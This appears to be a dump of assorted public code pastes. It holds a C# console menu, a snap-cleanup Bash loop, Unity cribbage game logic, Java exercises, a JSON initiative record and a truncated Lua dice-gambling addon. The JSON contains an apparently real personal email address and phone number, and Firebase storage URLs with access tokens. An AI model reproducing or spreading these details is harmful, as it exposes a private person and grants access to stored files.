            string text3 = ""Случайный текст 3"";

            var textArray = new List<string> { text1, text2, text3 };

            Random textRandom = new Random();

            Random minMaxRandomValue = new Random();

            int minRandomValue = 0;
            int maxRandomValue = 10;

            Console.WriteLine(""Добро пожаловать, выберите действие [1-4]: \n""
            + ""[1] Для вывода случайного текста введите 'Text' \n""
            + ""[2] Для вывода случайного числа от 0 до 10 введите 'Number' \n""
            + ""[3] Для очистки консоли введите 'Clear' \n""
            + ""[4] Для завершения работы используйте команду 'Exit'"");

            bool isWork = true;
            string userInput;

            while (isWork)
            {
                userInput = Console.ReadLine();

                switch (userInput)
                {
                    case CommandToShowRandomText:
                        int index = textRandom.Next(textArray.Count);
                        var text = textArray[index];
                        Console.WriteLine(text);
                        break;

                    case CommandToShowRandomNumber:
                        int randomNumber = minMaxRandomValue.Next(minRandomValue, maxRandomValue);
                        Console.WriteLine(""Выпало число "" + randomNumber);
                        break;

                    case CommandToClearConsole:
                        Console.Clear();
                        Console.WriteLine(""[1] Для вывода случайного текста введите 'Text' \n""
                        + ""[2] Для вывода случайного числа от 0 до 10 введите 'Number' \n""
                        + ""[3] Для очистки консоли введите 'Clear' \n""
                        + ""[4] Для завершения работы используйте команду 'Exit'"");
                        break;

                    case CommandToExit:
                        isWork = false;
                        Console.WriteLine(""Выход из программы"");
                        break;

                    default:
                        Console.WriteLine(""Неизвестная команда, попробуйте ещё раз"");
                        break;
                }
            }
        }
    }
}"
bcdzAjWu,Untitled,StoxBake,Bash,Tuesday 17th of June 2025 02:32:23 PM CDT,"#to remove old snap package 

  for s in $(snap list --all | awk '/disabled/{print $1}' | uniq); do
    for r in $(snap list ""$s"" --all | awk '/disabled/{print $3}'); do
         sudo snap remove --revision=""$r"" ""$s""
    done
done
"
B7prttHA,PlayHandsPhase.cs,SemlerPDX,C#,Tuesday 17th of June 2025 02:03:07 PM CDT,"using System.Collections;
using System.Collections.Generic;
using System.Linq;


using GameFramework.AI;
using GameFramework.CardZones;
using GameFramework.Data;
using GameFramework.Utilities;

using UnityEngine;

namespace GameFramework.GamePhases
{
    public class PlayHandsPhase : GamePhaseBase
    {
        private static readonly WaitForSeconds _pauseOpponentThink = new(0.9f);
        private static readonly WaitForSeconds _pauseShowGo = new(1.2f);
        private static readonly WaitForSeconds _pauseShowLastCard = new(1.5f);

        protected override IEnumerator RunPhaseLogic()
        {
            // Starts or Continues the Play Hands Phase --
            // This phase has two additional phases with two sub-phase event triggered functions
            // following the base phase, for selecting cards or clicking go button
            // This phase naturally transitions to/from CountHands phase when all cards have been played while peg score < 131
            // This phase may also transition to/from the MovingPegs phase (and its additional phase MovePeg)
            // When in a PlayerOut phase, only one player has cards and board had been reset - no go points, just play out

            TrySetActiveState(Context.TableScoreTotalPanel, true);

            // ---- PLAYER GO BUTTON ----
            if (Context.PlayPanelGoButton.activeSelf)
            {
                TrySetActiveState(Context.PlayPanelGoButton, false);
            }
            else
            {
                if (CurrentPhase == GamePhase.PlayHands)
                {
                    SetPhase(GamePhase.PlayCard);
                }
            }

            // ---- PLAYER OUT PHASE ----
            if (CurrentPhase == GamePhase.PlayerOut)
            {
                yield return HandleOpponentPlayOut();
                yield break;
            }

            // ---- PLAYER CARD SELECTED ----
            if (SelectedCard != null)
            {
                yield return HandlePlayerMove(SelectedCard);
                yield return HandlePlayerPlayOut();
                yield break;
            }

            // ---- WHOSE TURN? ----
            var isNewRound = IsNewRound();
            var isPlayerCribOwner = IsPlayerCribOwner();
            var playerHand = Context.PlayerHandManager.GetCards();
            var opponentHand = Context.OpponentHandManager.GetCards();

            // Player or opponent leads?
            var isOpponentsMove = (LastPlayer == GamePlayer.Player1) || !HasPlayableCard(playerHand);
            var isPlayersMove = (isNewRound && !isPlayerCribOwner) || (!isNewRound && !isOpponentsMove);

            // ---- NEW ROUND SCENARIO: Need to ensure table score is zeroed ----
            if (isNewRound)
            {
                UpdateRunningScore(0);
            }

            // ---- GO SCENARIO: No one can play, but table <= 31 ----
            var tableScore = GetCurrentTableScore();
            if (!IsCountPhaseReady() && !HasPlayableCard(playerHand) && !HasPlayableCard(opponentHand))
            {
                if (tableScore != 31 && LastPlayer == GamePlayer.Player1)
                {
                    SetPhase(GamePhase.PlayHands);

                    yield return ShowGoMessage();
                }

                if (tableScore == 31)
                {
                    if (LastPlayer != GamePlayer.Opponent)
                    {
                        SetPhase(GamePhase.PlayHands);
                    }
                }

                yield return MovePlayedCardsToPlayedZone();

                ResetTableScore();

                if (!CheckAndEnterPlayOut())
                {
                    if (LastPlayer == GamePlayer.Opponent)
                    {
                        SetPhase(GamePhase.PlayCard);
                    }
                }

                yield break;
            }

            // ---- LAST CARD/COUNT PHASE ----
            if (IsCountPhaseReady())
            {
                if (tableScore < 31)
                {
                    yield return ShowLastCardMessage();
                }

                yield break;
            }

            // ---- PLAYER MOVE CHECK ----
            if (isPlayersMove)
            {
                // Wait for player input (card select or Go button)
                // Defensive: if player can't play, show Go button
                if (!HasPlayableCard(playerHand) && HasPlayableCard(opponentHand))
                {
                    TrySetActiveState(Context.PlayPanelGoButton, true);
                }

                if (!CheckAndEnterPlayOut())
                {
                    SetPhase(GamePhase.PlayCard);
                }

                yield break;
            }

            // ---- OPPONENT MOVE CHECK ----
            if (HasPlayableCard(opponentHand))
            {
                yield return HandleOpponentMove();

                tableScore = GetCurrentTableScore();
                if (tableScore == 31)
                {
                    // TODO: Opponent scores 2 points, implement scoring event later

                    yield return MovePlayedCardsToPlayedZone();

                    ResetTableScore();

                    yield break;
                }

                // If EITHER player has cards in PlayHands/PlayCard phase, it is still not over and go button should be conditionally shown to player
                var isRoundStillGoing = CurrentPhase != GamePhase.PlayerOut && CurrentPhase != GamePhase.CountHands;
                var canStillPlay = playerHand.Count > 0 || Context.OpponentHandManager.GetCards().Count > 0;
                if (isRoundStillGoing && canStillPlay)
                {
                    TrySetActiveState(Context.PlayPanelGoButton, !HasPlayableCard(playerHand));
                }

                if (!canStillPlay)
                {
                    if (IsCountPhaseReady() && tableScore < 31)
                    {
                        yield return ShowLastCardMessage();
                    }
                }

                yield break;
            }
            else
            {
                if (tableScore != 31 && LastPlayer == GamePlayer.Player1)
                {
                    // TODO:  Player scores a go point

                    yield return ShowGoMessage();
                }
            }
        }

        // ------------------- HELPERS & HANDLERS -------------------

        private IEnumerator HandlePlayerMove(CardData card)
        {
            var playerHand = Context.PlayerHandManager.GetCards();
            if (!playerHand.Contains(card) || !CheckCanPlay(card))
            {
                yield break;
            }

            // Move card
            ZonesCardTransfer.TransferCard(
                Context.PlayerHandManager,
                Context.CardPlayPanelManager,
                card,
                Context.CardSprites,
                Context.CardSprites[card.SpriteName]);

            SetLastPlayer(GamePlayer.Player1);
            Context.PlayerLowestCardManager.AddCard(card, Context.CardSprites);
            UpdateRunningScore(card.Value);

            // Check for playout state (if PlayerOut phase, clear table if needed)
            if (CurrentPhase == GamePhase.OpponentOut && IsCountPhaseReady())
            {
                if (GetCurrentTableScore() == 31)
                {
                    // TODO: 2 points to this player here, fire event when scoring system implemented
                }
            }

            // Normal flow: let opponent move else wait for next player action on playout
            if (CurrentPhase != GamePhase.OpponentOut)
            {
                SetPhase(GamePhase.PlayHands);
            }
        }

        private IEnumerator HandleOpponentMove()
        {
            yield return _pauseOpponentThink;

            var opponentHand = Context.OpponentHandManager.GetCards();
            var playZone = Context.CardPlayPanelManager.GetCards();
            var card = OpponentCardSelection.GetPlayCard(opponentHand, playZone, GetCurrentTableScore());

            if (card == null)
            {
                if (CurrentPhase != GamePhase.PlayerOut)
                {
                    SetPhase(GamePhase.PlayHands);
                }

                yield break;
            }

            ZonesCardTransfer.TransferCard(
                Context.OpponentHandManager,
                Context.CardPlayPanelManager,
                card,
                Context.CardSprites,
                Context.CardSprites[card.SpriteName]);

            SetLastPlayer(GamePlayer.Opponent);
            Context.OpponentLowestCardManager.AddCard(card, Context.CardSprites);
            UpdateRunningScore(card.Value);

            if (CurrentPhase == GamePhase.PlayerOut && IsCountPhaseReady())
            {
                if (GetCurrentTableScore() == 31)
                {
                    // TODO: 2 points to this player here, fire event when scoring system implemented
                }
                else
                {
                    yield return ShowLastCardMessage();
                }
            }
        }

        private IEnumerator HandlePlayerPlayOut()
        {
            // ---- PHASE OUT LOGIC ----
            if (CurrentPhase != GamePhase.OpponentOut)
            {
                yield break;
            }

            var playerHand = Context.PlayerHandManager.GetCards();
            if (playerHand.Count == 0)
            {
                yield return MovePlayedCardsToPlayedZone();

                SetPhase(GamePhase.CountHands);

                yield break;
            }
        }

        private IEnumerator HandleOpponentPlayOut()
        {
            var opponentHand = Context.OpponentHandManager.GetCards();
            if (opponentHand.Count == 0)
            {
                yield return MovePlayedCardsToPlayedZone();

                SetPhase(GamePhase.CountHands);

                yield break;
            }

            yield return HandleOpponentMove();
        }

        private IEnumerator ShowGoMessage()
        {
            TrySetActiveState(Context.PlayPanelGoMessage, true);

            // TODO: Player1 earns 1 point for go, once scoring is implemented

            yield return _pauseShowGo;

            TrySetActiveState(Context.PlayPanelGoMessage, false);
        }

        private IEnumerator ShowLastCardMessage()
        {
            var isActiveSelf = Context.PlayerLastCardMessage.activeSelf || Context.OpponentLastCardMessage.activeSelf;
            if (isActiveSelf)
            {
                yield break; // Should not happen, but defensive check
            }

            var lastPlayerIsPlayer = (LastPlayer == GamePlayer.Player1);
            TrySetActiveState(Context.PlayerLastCardMessage, lastPlayerIsPlayer);
            TrySetActiveState(Context.OpponentLastCardMessage, !lastPlayerIsPlayer);

            yield return _pauseShowLastCard;

            TrySetActiveState(Context.PlayerLastCardMessage, false);
            TrySetActiveState(Context.OpponentLastCardMessage, false);
        }

        private IEnumerator MovePlayedCardsToPlayedZone()
        {
            var playZone = Context.CardPlayPanelManager;
            var playedZone = Context.CardsPlayedPanelManager;
            var currentCards = playZone.GetCards().ToList();

            foreach (var card in currentCards)
            {
                ZonesCardTransfer.TransferCard(playZone, playedZone, card, Context.CardSprites);
                yield return new WaitForSeconds(0.15f);
            }

            playZone.ClearZone();

            yield return new WaitForSeconds(0.4f);
        }

        private void ResetTableScore()
        {
            UpdateRunningScore(0);
            TrySetActiveState(Context.PlayPanelGoButton, false);
            TrySetActiveState(Context.PlayPanelGoMessage, false);
        }

        // --------------- Utility Logic ---------------

        private bool HasPlayableCard(IReadOnlyList<CardData> hand)
        {
            foreach (var card in hand)
            {
                if (CheckCanPlay(card))
                {
                    return true;
                }
            }

            return false;
        }

        private bool IsNewRound()
        {
            var isPlayerHandFull = Context.PlayerHandManager.GetCards().Count == 4;
            var isOpponentHandFull = Context.OpponentHandManager.GetCards().Count == 4;
            return isPlayerHandFull && isOpponentHandFull;
        }

        private bool IsPlayerCribOwner()
        {
            return Context.PlayerCribPanelManager.GetCards().Count > 0;
        }

        private bool CheckAndEnterPlayOut()
        {
            var playerHand = Context.PlayerHandManager.GetCards();
            var opponentHand = Context.OpponentHandManager.GetCards();
            var playerOut = playerHand.Count == 0;
            var opponentOut = opponentHand.Count == 0;

            if (playerOut && !opponentOut)
            {
                SetPhase(GamePhase.PlayerOut);
                return true;
            }

            if (opponentOut && !playerOut)
            {
                SetPhase(GamePhase.OpponentOut);
                return true;
            }

            return false;
        }

        private int GetCurrentTableScore()
        {
            var text = Context.TableScoreValueTextMesh.text ?? ""0"";
            return int.TryParse(text, out int score) ? score : 0;
        }

        private void UpdateRunningScore(int value)
        {
            var current = GetCurrentTableScore();
            current = value == 0 ? 0 : current + GetNormalizedValue(value);
            Context.TableScoreValueTextMesh.text = current.ToString();

            // TODO: Check for 15-2 and 31 for 2 here when scoring events implemented (??)
        }

        private bool IsCountPhaseReady()
        {
            var playerCardsCount = Context.PlayerHandManager.GetCards().Count;
            var opponentCardsCount = Context.OpponentHandManager.GetCards().Count;
            if (playerCardsCount == 0 && opponentCardsCount == 0)
            {
                TrySetActiveState(Context.PlayPanelGoButton, false); // TEST: Commented out ResetTablescore, using this now
                TrySetActiveState(Context.PlayPanelGoMessage, false); // TEST: Commented out ResetTablescore, using this now
                SetPhase(GamePhase.CountHands);
                return true;
            }

            return false;
        }

        // NOTE: now repeated this method in AI class OpponentCardSelection - consider util later
        private int GetNormalizedValue(int value) => value > 10 ? 10 : value;

        private bool CheckCanPlay(CardData card)
        {
            var cardValue = GetNormalizedValue(card.Value);
            var currentScore = GetCurrentCardsCount();
            return currentScore + cardValue <= 31;
        }

        private int GetCurrentCardsCount()
        {
            var playZone = Context.CardPlayPanelManager;
            var currentCards = playZone.GetCards();
            return currentCards.Sum(card => GetNormalizedValue(card.Value));
        }
    }
}
"
LKk4r1Ae,GamePhasesBase.cs,SemlerPDX,C#,Tuesday 17th of June 2025 02:02:16 PM CDT,"using System;
using System.Collections;

using GameFramework.Data;

using UnityEngine;

namespace GameFramework.GamePhases
{
    /// <summary>
    /// Base class for game phases in the game framework.
    /// </summary>
    public abstract class GamePhaseBase
    {
        /// <summary>
        /// The game context data for this game phase, containing all necessary information about the game state.
        /// </summary>
        protected GameContextData Context { get; private set; }

        /// <summary>
        /// The current phase of the game.
        /// </summary>
        protected GamePhase CurrentPhase { get; private set; }

        /// <summary>
        /// The last player who took an action in the game, if applicable.
        /// </summary>
        protected GamePlayer LastPlayer { get; private set; }

        /// <summary>
        /// The card data for the optionally selected card in this phase, if applicable.
        /// </summary>
        protected CardData SelectedCard { get; private set; }

        /// <summary>
        /// Action to be invoked when the current phase is completed, passing the next phase to transition to<br/>
        /// and the last player who took action, if applicable.
        /// </summary>
        protected Action<GamePhase, GamePlayer> OnPhaseComplete;

        /// <summary>
        /// Initializes the game phase with the provided context and current phase, and optional last player<br/>
        /// and/or selected card. Runs the phase logic in the next frame, and when complete, runs the End method.
        /// </summary>
        /// <param name=""context"">The game context data for this game.</param>
        /// <param name=""currentPhase"">The current phase of the game.</param>
        /// <param name=""onPhaseComplete"">The action to complete upon ending this phase.</param>
        /// <param name=""lastPlayer"">An optional GamePlayer last player variable indicating who took an action in the game.</param>
        /// <param name=""selectedCard"">An optional CardData object of a selected card.</param>
        public IEnumerator Begin(
            GameContextData context, GamePhase currentPhase, Action<GamePhase, GamePlayer> onPhaseComplete,
            GamePlayer lastPlayer = GamePlayer.None,
            CardData selectedCard = null
        )
        {
            Context = context;
            CurrentPhase = currentPhase;
            OnPhaseComplete = onPhaseComplete;
            LastPlayer = lastPlayer;
            SelectedCard = selectedCard;

            // Allow phase to run in the next frame
            yield return RunPhaseLogic(); 

            End(CurrentPhase, LastPlayer);
        }

        /// <summary>
        /// Runs the logic for the current game phase. This method should be overridden in derived classes to implement specific phase behavior.
        /// </summary>
        protected abstract IEnumerator RunPhaseLogic();

        /// <summary>
        /// Sets the last player that took an action.
        /// </summary>
        /// <param name=""player"">The last player who took an action.</param>
        public void SetLastPlayer(GamePlayer player)
        {
            LastPlayer = player;
        }

        /// <summary>
        /// Sets the current game phase property.
        /// </summary>
        /// <param name=""phase"">The new game phase to set.</param>
        public void SetPhase(GamePhase phase)
        {
            //Debug.LogWarning($""Setting phase to {phase} from {CurrentPhase}"");
            CurrentPhase = phase;
        }

        /// <summary>
        /// Attempts to set the active state of a GameObject based on the provided boolean value.<br/>
        /// Does not call SetActive method if current state matches requested <see cref=""isActive""/> state.
        /// </summary>
        /// <param name=""gameObject"">The Unity GameObject to call SetActive upon.</param>
        /// <param name=""isActive"">The active state to set.</param>
        public void TrySetActiveState(GameObject gameObject, bool isActive)
        {
            if (gameObject.activeSelf != isActive)
            {
                gameObject.SetActive(isActive);
            }
        }

        /// <summary>
        /// Ends the current game phase and fires the OnPhaseComplete action supplied in the Begin method.
        /// </summary>
        /// <param name=""nextPhase"">The next game phase proposed by this phase ending.</param>
        /// <param name=""lastPlayer"">An optional GamePlayer last player variable indicating who took an action in the game.</param>
        private void End(GamePhase nextPhase, GamePlayer lastPlayer)
        {
            OnPhaseComplete?.Invoke(nextPhase, lastPlayer);
        }
    }
}
"
Zzw1T2xG,Untitled,Josif_tepe,Java,Tuesday 17th of June 2025 01:04:05 PM CDT,"import java.util.Random;

class Tocka {
    private double x;
    private double y;


    public Tocka(double x, double y) {
        this.x = x;
        this.y = y;
    }

    public double getX() {
        return x;
    }
    public double getY() {
        return y;
    }
    public void setX(double x) {
        this.x = x;
    }
    public void setY(double y) {
        this.y = y;
    }

}
public class Naloga14 {
    static Tocka sredina(Tocka a, Tocka b) {
        return new Tocka(0.5 * (a.getX() + b.getX()), 0.5 * (a.getY() + b.getY()));
    }
    public static void main(String[] args) {
        StdDraw.setScale(0, 100);
         Tocka[] tocki = new Tocka[3];
         tocki[0] = new Tocka(10, 10);
         tocki[1] = new Tocka(90, 10);
         tocki[2] = new Tocka(50, 90);

         Random random = new Random();

         int x = random.nextInt(100);
         int y;
         if(x < 50) {
            y = 2 * x + 1;
         }
         else {
            y = 2 * (100 - x)+ 1;
         }
         Tocka tocka = new Tocka(x, y);

         for(int i = 0; i < 10000; i++) {
            int j = random.nextInt(3);
            Tocka sredisnaTocka = sredina(tocki[j], tocka);

            StdDraw.line(sredisnaTocka.getX(), sredisnaTocka.getY(), sredisnaTocka.getX(), sredisnaTocka.getY());
            tocka = sredisnaTocka;
         }
    }
}
"
xuAMPwQ6,Untitled,Josif_tepe,Java,Tuesday 17th of June 2025 12:28:49 PM CDT,"import java.io.File;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.HashMap;
import java.util.Scanner;

class Drzava {
    private String kratenica;
    private String drzava;
    private int brojZiteli;

    public Drzava(String kratenica, String drzava, int brojZiteli) {
        this.kratenica = kratenica;
        this.drzava = drzava;
        this.brojZiteli = brojZiteli;
    }

    public String getKratenica() {
        return kratenica;
    }
    public String getDrzava() {
        return drzava;
    }
    public int getBrojZiteli() {
        return brojZiteli;
    }
    public void setKratenica(String kratenica) {
        this.kratenica = kratenica;
    }
    public void setDrzava(String drzava) {
        this.drzava = drzava;
    }
    public void setBroZiteli(int brojZiteli) {
        this.brojZiteli = brojZiteli;
    }
    public int presmetajMilioni() {
        return Math.round((float) brojZiteli / 1000000f);
    }
}
public class Naloga13 {
    static HashMap<String, Drzava> preberiDrzava(String imeDatoteke) {
        HashMap<String, Drzava> map = new HashMap<>();

        try {
            Scanner scanner = new Scanner(new File(imeDatoteke));
            while(scanner.hasNextLine()) {
                String line = scanner.nextLine();
                String[] niza = line.split("":"");
                map.put(niza[0], new Drzava(niza[0], niza[1], Integer.parseInt(niza[2])));
            }

        }
        catch(Exception e) {
            System.out.println(""Error "" + e);
        }

        return map;
    }
    public static void main(String[] args) {
        HashMap<String, Drzava> map = preberiDrzava(args[0]);
        ArrayList<String> keys = new ArrayList<>(map.keySet());

        keys.sort(new Comparator<String>() {
            @Override
            public int compare(String a, String b) {
                Drzava d1 = map.get(a);
                Drzava d2 = map.get(b);

                if(d1.presmetajMilioni() == d2.presmetajMilioni()) {
                    return d1.getDrzava().compareTo(d2.getDrzava());
                }
                
                return d1.presmetajMilioni() - d2.presmetajMilioni();
            }
        }); 
        
        int current_million = -1;
        for(int i = 0; i < keys.size(); i++) {
            String drzava = keys.get(i);

            Drzava d = map.get(drzava);

            if(current_million != d.presmetajMilioni()) {
                current_million = d.presmetajMilioni();
                System.out.println(current_million + ""M"");
            }
            System.out.println(""  - "" + d.getDrzava() + "" ("" + d.getKratenica() + ""), "" + d.getBrojZiteli());
        }
        
    }
}
"
fjibJ55t,Untitled,bebo231312312321,JavaScript,Tuesday 17th of June 2025 12:05:41 PM CDT,"{
    ""title"": ""dasdsadsa"",
    ""slug"": ""dasdsadsa"",
    ""shortDescription"": ""dsadsadsa"",
    ""mainImage"": {
        ""src"": """",
        ""alt"": """",
        ""caption"": """",
        ""gallery"": []
    },
    ""category"": ""Environment"",
    ""location"": {
        ""address"": ""бл. 28, ж.к. Разсадника-Коньовица, ж.к. Разсадник-Коньовица, София, Красна поляна, Столична, София-град, 1379, България"",
        ""coordinates"": {
            ""lat"": 42.69685314805044,
            ""lng"": 23.29135894775391
        }
    },
    ""status"": ""active"",
    ""campaignStatus"": ""open"",
    ""commentsEnabled"": true,
    ""contact"": {
        ""name"": ""dsadsa"",
        ""position"": ""dsadsa"",
        ""email"": ""borislaviliev47@gmail.com"",
        ""phone"": ""+359894371779"",
        ""image"": """"
    },
    ""additionalContacts"": [],
    ""sections"": [
        {
            ""titleSlug"": ""section-1750178285037"",
            ""title"": ""dsadsa"",
            ""content"": ""<p>dsadsadsa</p>"",
            ""images"": [
                {
                    ""src"": ""https://firebasestorage.googleapis.com/v0/b/pensaclub-909e0.appspot.com/o/initiatives%2Fsections%2Fsection-0%2F38b41824-0786-4cc9-8681-2f5eecf2fa11?alt=media&token=7705d07f-0816-4945-af3a-6b2620d53545"",
                    ""alt"": ""dsa"",
                    ""caption"": ""dasdsa"",
                    ""isUploading"": false
                }
            ]
        }
    ],
    ""downloadMaterials"": [],
    ""projects"": [],
    ""stories"": [],
    ""publications"": [],
    ""detailedDescription"": ""<p>dsadsadsadsadsadsa</p>"",
    ""customCategory"": """",
    ""priority"": ""Medium"",
    ""startDate"": ""2025-06-12"",
    ""endDate"": """",
    ""duration"": """",
    ""milestones"": [],
    ""targetAge"": [
        ""All ages""
    ],
    ""targetAudience"": [],
    ""customAudience"": ""dsadsadsasaas"",
    ""expectedBudget"": ""432"",
    ""currency"": ""BGN"",
    ""fundingSources"": [
        ""Sponsors"",
        ""Self-funded""
    ],
    ""partners"": [
        {
            ""id"": ""1750178329729-i6v2lpwet"",
            ""name"": ""dsadsasa"",
            ""description"": ""dsadsadsa"",
            ""website"": """",
            ""type"": ""Strategic"",
            ""logo"": ""https://firebasestorage.googleapis.com/v0/b/pensaclub-909e0.appspot.com/o/initiatives%2Fpartners%2F0a3832aa-7633-450b-819b-2981ab6e810d?alt=media&token=0b4a42a5-5536-4a92-9db0-f1006420e676"",
            ""visible"": true
        }
    ],
    ""sponsors"": [],
    ""logo"": ""https://firebasestorage.googleapis.com/v0/b/pensaclub-909e0.appspot.com/o/initiatives%2Flogos%2F48c20117-36a9-4190-921b-34e2a7e46c85?alt=media&token=0e3ae544-2c73-485e-8495-8b1169b19792"",
    ""responsible"": {
        ""name"": ""dsasaddsa"",
        ""position"": """",
        ""email"": ""borislaviliev47@gmail.com"",
        ""phone"": ""+359894371779""
    },
    ""organization"": {
        ""name"": ""dsasasad"",
        ""address"": ""dsadsadsaasdsadsadsa "",
        ""website"": """"
    },
    ""socialMedia"": {
        ""facebook"": """",
        ""instagram"": """",
        ""linkedin"": """",
        ""twitter"": """"
    },
    ""kpis"": [],
    ""expectedResults"": ""<p>dsadsadsa</p>"",
    ""progressReport"": ""<p>dsadsadsa</p>"",
    ""impactMetrics"": [],
    ""testimonials"": [],
    ""tags"": [],
    ""relatedInitiatives"": [],
    ""faq"": [],
    ""gallery"": [
        {
            ""src"": ""https://firebasestorage.googleapis.com/v0/b/pensaclub-909e0.appspot.com/o/initiatives%2Fgallery%2Fc6ccd133-b77d-4150-8439-17533ce8fe6a?alt=media&token=3f2e0592-4441-420d-9f85-a22f7fdb82ce"",
            ""alt"": ""da"",
            ""caption"": ""dsadsasda"",
            ""isUploading"": false
        }
    ],
    ""createdAt"": ""2025-06-17T16:40:33.158Z"",
    ""updatedAt"": ""2025-06-17T16:40:33.158Z""
}"
6eTY9VY5,DiceGames.lua,Kaev,Lua,Tuesday 17th of June 2025 11:36:23 AM CDT,"-- Chat Config values
local TRADE_GOLD_RECEIVED_ANNOUNCEMENT = ""%s Bets %s!""; -- First %s is the players name, second %s is the gold amount
local TRADE_GOLD_GIVEN_ANNOUNCEMENT = ""%s received %s!""; -- First %s is the players name, second %s is the gold amount
local GOLD = ""%d Gold"";
local SILVER = ""%d Silver"";
local COPPER = ""%d Copper"";

-- Dice Config Values
local GAME_DICE_KEYWORD_OVER = ""over"";
local GAME_DICE_KEYWORD_UNDER = ""under"";
local GAME_DICE_WIN_MESSAGE = ""Congratulations %s! You won the dice game! We rolled %s and you picked %s.""; -- First %s is the players name, second %s is the total rolled, third %s is the players choice (over or under)
local GAME_DICE_LOSE_MESSAGE = ""Sorry %s! You lost the dice game! We rolled %s and you picked %s.""; -- First %s is the players name, second %s is the total rolled, third %s is the players choice (over or under)

-- Don't change anything below this line
local GAME_DICE_ROLL_COUNT = 2; -- Don't change! There is a hard check for the value 7 in this addon. Any change will break the game.

-- Prize Stuff
local OPEN_PRIZES = {};

local function AddOpenPrize(playerName, amount)
    if (OPEN_PRIZES[playerName] == nil) then
        OPEN_PRIZES[playerName] = amount;
    else
        OPEN_PRIZES[playerName] = OPEN_PRIZES[playerName] + amount;
    end
end

local function HasOpenPrize(playerName)
    return OPEN_PRIZES[playerName] ~= nil and OPEN_PRIZES[playerName] > 0;
end

local function GetOpenPrize(playerName)
    return OPEN_PRIZES[playerName] or 0;
end

local function UpdateOpenPrize(playerName, amount)
    if (OPEN_PRIZES[playerName] == nil) then
        OPEN_PRIZES[playerName] = 0;
        return;
    end

    OPEN_PRIZES[playerName] = math.max(0, OPEN_PRIZES[playerName] - amount);
end

-- Game stuff
local CURRENT_GAMES = {};

local function StartNewGame(playerName, betAmount)
    CURRENT_GAMES[playerName] = {
        gamemode = ""dice"",
        player = playerName,
        choice = nil, -- over or under
        bet = betAmount,
        rolls = {},
        total = 0,
        winner = nil
    };
end

local function RemoveFinishedGame(game)
    CURRENT_GAMES[game.player] = nil;
end

local function HasCurrentGame(playerName)
    return CURRENT_GAMES[playerName] ~= nil;
end

local function GetCurrentGame(playerName)
    return CURRENT_GAMES[playerName];
end

local function DoGameRolls(game)
    if (game.gamemode == ""dice"") then
        for i=1, GAME_DICE_ROLL_COUNT do
            RandomRoll(1, 6);
        end
    end
end

local function IsGameUnfinished(game)
    if (game.gamemode == ""dice"") then
        return game.winner == nil and game.choice ~= nil
    end
end

local function GetFirstUnfinishedGame()
    for playerName, game in pairs(CURRENT_GAMES) do
        if IsGameUnfinished(game) then
            return game;
        end
    end
    return nil;
end

local function AssignRollToGame(game, roll)
    if (game.gamemode == ""dice"") then
        game.rolls[#game.rolls + 1] = roll;
        game.total = game.total + roll;
    end
end

local function HandleGameLogic(game)
    if (game.gamemode == ""dice"") then
        if (#game.rolls < GAME_DICE_ROLL_COUNT) then
            return; -- Not enough rolls yet
        end

        if (game.choice == GAME_DICE_KEYWORD_OVER and game.total > 7) or (game.choice == GAME_DICE_KEYWORD_UNDER and game.total < 7) then
            game.winner = game.player;
            local msg = GAME_DICE_WIN_MESSAGE:format(game.player, game.total, game.choice);
            SendChatMessage(msg, ""YELL"");
            AddOpenPrize(game.player, game.bet * 2);
            InitiateTrade(game.player);
        else
            game.winner = UnitName(""player"");
            local msg = GAME_DICE_LOSE_MESSAGE:format(game.player, game.total, game.choice);
            SendChatMessage(msg, ""YELL"");
        end

        RemoveFinishedGame(game);
    end
end

-- Trade stuff
local ROLL_PATTERN = RANDOM_ROLL_RESULT
  :gsub(""[%-%(%)]"", ""%%%1"") -- Escape special chars
  :gsub(""%%%d%$s"", ""(%%S+)"") -- Prepare player name
  :gsub(""%%%d%$d"", ""(%%d+)"") -- Prepare roll numbers

local CURRENT_TRADE = {
    name = """",
    playerGold = 0,
    targetGold = 0
}

local function ResetCurrentTrade()
    CURRENT_TRADE.name = """";
    CURRENT_TRADE.playerGold = 0;
    CURRENT_TRADE.targetGold = 0;
end

local function CopperToMoneyString(copper)
    if (copper == nil or copper <= 0) then
        return ""-Nothing-"";
    end

    local gold = math.floor(copper / 10000);
    local silver = math.floor((copper % 10000) / 100);
    local copper = copper % 100;
    return string.trim(string.format(""%s %s %s"", 
        gold > 0 and string.format(GOLD, gold) or """",
        silver > 0 and string.format(SILVER, silver) or """",
        copper > 0 and string.format(COPPER, copper) or """"));
end

local function TradeComplete()
    if (TRADE_GOLD_RECEIVED_ANNOUNCEMENT ~= """" and CURRENT_TRADE.targetGold > 0) then
        local msg = TRADE_GOLD_RECEIVED_ANNOUNCEMENT:format(CURRENT_TRADE.name, CopperToMoneyString(CURRENT_TRADE.targetGold));
        SendChatMessage(msg, ""YELL"");
    end

    if (TRADE_GOLD_GIVEN_ANNOUNCEMENT ~= """" and CURRENT_TRADE.playerGold > 0) then
        local msg = TRADE_GOLD_GIVEN_ANNOUNCEMENT:format(CURRENT_TRADE.name, CopperToMoneyString(CURRENT_TRADE.playerGold));
        SendChatMessage(msg, ""YELL"");
        UpdateOpenPrize(CURRENT_TRADE.name, tonumber(CURRENT_TRADE.playerGold));
    end

    if (CURRENT_TRADE.targetGold > 0) then
        StartNewGame(CURRENT_TRADE.name, CURRENT_TRADE.targetGold);
    end

    ResetCurrentTrade();
end

local function OnTradeRequestCancel()
    ResetCurrentTrade();
end

local function OnTradeShow()
    local traderName = strtrim(_G.TradeFrameRecipientNameText:GetText());
    ResetCurrentTrade();
    CURRENT_TRADE.name = traderName;
    CURRENT_TRADE.playerGold = 0;
    CURRENT_TRADE.targetGold = 0;

    if (HasOpenPrize(traderName)) then
        local openPrize = GetOpenPrize(traderName);
        print(""Open prize found for ""..traderName.."": ""..CopperToMoneyString(openPrize));
    end
end

local function OnTradeMoneyChanged()
    CURRENT_TRADE.playerGold = tonumber(GetPlayerTradeMoney()) or 0;
    CURRENT_TRADE.targetGold = tonumber(GetTargetTradeMoney()) or 0;
end

local function OnUiInfoMessage(message)
    if (message == ERR_TRADE_COMPLETE) then
        TradeComplete();
    end
end

local TIMER_ELAPSED = 0;
local function OnUpdate(elapsed)
    if (not TradeFrame:IsShown()) then
        return;
    end
    TIMER_ELAPSED = TIMER_ELAPSED + elapsed;
    if (TIMER_ELAPSED > 0.05) then
        CURRENT_TRADE.playerGold = tonumber(GetPlayerTradeMoney()) or 0;
        CURRENT_TRADE.targetGold = tonumber(GetTargetTradeMoney()) or 0;
    end
end

-- General stuff
local function OnSystemMessage(message)
